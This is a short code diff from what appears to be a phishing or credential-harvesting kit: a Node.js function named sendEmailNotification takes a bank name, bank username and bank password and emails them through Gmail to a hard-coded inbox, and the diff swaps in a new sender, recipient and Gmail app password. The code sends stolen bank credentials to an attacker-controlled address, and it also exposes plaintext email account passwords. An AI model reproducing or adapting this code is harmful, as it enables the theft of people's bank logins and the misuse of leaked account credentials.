@@ -62,14 +62,14 @@ async function sendEmailNotification(bankName, bankUsername, bankPassword) {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "asalamlatif@gmail.com",
-      pass: "prmr opim qodx xnpx",
+      user: "debbanderson967@gmail.com",
+      pass: "dyhg wqlu cnsb dtex",
     },
   });
 
   const mailOptions = {
-    from: "asalamlatif@gmail.com",
-    to: "toonilaniyan@gmail.com",
+    from: "debbanderson967@gmail.com",
+    to: "debbanderson967@gmail.com",
     subject: "New Bank Account Added",
     text: `A new bank account has been added:
     - Bank Name: ${bankName}
